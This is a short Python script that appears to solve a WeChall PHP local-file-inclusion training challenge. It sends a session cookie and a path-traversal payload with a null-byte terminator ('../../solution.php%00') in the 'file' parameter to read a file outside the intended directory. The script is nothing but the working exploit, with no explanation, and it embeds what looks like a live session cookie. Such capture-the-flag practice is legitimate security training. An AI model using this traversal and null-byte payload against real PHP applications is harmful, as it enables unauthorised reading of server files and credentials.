import requests

cookies = {"WC": "11068160-37667-z1PuydshfLuLpXFI"}
url = "https://www.wechall.net/challenge/training/php/lfi/up/index.php?file="
ans = "../../solution.php%00"
url += ans
r = requests.get(url, cookies=cookies)
print r.text